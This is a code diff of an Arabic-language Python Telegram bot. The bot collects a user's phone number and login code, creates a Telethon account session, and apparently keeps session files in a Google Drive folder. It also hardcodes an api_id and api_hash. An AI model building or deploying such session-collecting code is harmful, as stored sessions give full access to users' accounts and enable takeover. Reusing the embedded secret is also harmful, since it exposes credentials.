@@ -97,13 +97,13 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("أدخل رقم الهاتف الخاص بك مع رمز الدولة (مثل: +201234567890):")
     return PHONE
 
+
 async def process_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    drive_service = initialize_drive()
     user_id = update.message.from_user.id
     phone_number = update.message.text.strip()
 
     # إعداد بيانات ملف الجلسة
-    session_file = f"/session_{user_id}.session"
+    session_file = f"/tmp/session_{user_id}.session"
     api_id = 26466946
     api_hash = '05d7144ca3c5f4594e40c535afb3bd5a'
 
@@ -113,6 +113,8 @@ async def process_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         'parents': [FOLDER_ID],
         'mimeType': 'application/octet-stream'
     }
+
+    print(f"مسار ملف الجلسة: {session_file}")
 
     # التحقق من الجلسة المحلية وحذفها إذا كانت تالفة
     if os.path.exists(session_file):
@@ -126,17 +128,6 @@ async def process_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             print(f"حدث خطأ أثناء التحقق من الجلسة: {e}. سيتم حذفها.")
             os.remove(session_file)
-
-            # حذف الجلسة من Google Drive
-            try:
-                query = f"name='{file_metadata['name']}' and '{FOLDER_ID}' in parents"
-                response = drive_service.files().list(q=query, fields="files(id)").execute()
-                if response['files']:
-                    file_id = response['files'][0]['id']
-                    drive_service.files().delete(fileId=file_id).execute()
-                    print(f"تم حذف الجلسة التالفة من Google Drive: File ID: {file_id}")
-            except Exception as drive_error:
-                print(f"خطأ أثناء حذف الجلسة من Google Drive: {drive_error}")
 
     # إنشاء جلسة جديدة
     client = TelegramClient(session_file, api_id, api_hash)
@@ -165,7 +156,8 @@ async def process_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await update.message.reply_text(f"حدث خطأ أثناء إنشاء الجلسة: {e}")
         return PHONE
-        
+
+
 async def process_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.message.from_user.id
     code = update.message.text.strip().replace(" ", "")
